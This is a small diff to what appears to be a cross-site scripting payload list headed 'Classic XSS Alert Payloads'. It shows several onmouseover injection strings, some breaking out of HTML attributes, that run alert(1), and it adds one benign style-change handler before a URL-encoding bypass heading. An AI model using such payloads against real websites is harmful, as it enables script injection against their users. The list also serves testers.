@@ -74,6 +74,7 @@ Classic XSS Alert Payloads :)
         '"><h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
         '<h1 id="demo" onmouseover="alert(1)">Mouse over me</h1>'
 	'">onmouseover=alert(1)'
+	onmouseover="this.style.color='red'"
 
 
 	XSS Bypass by Url Encoding
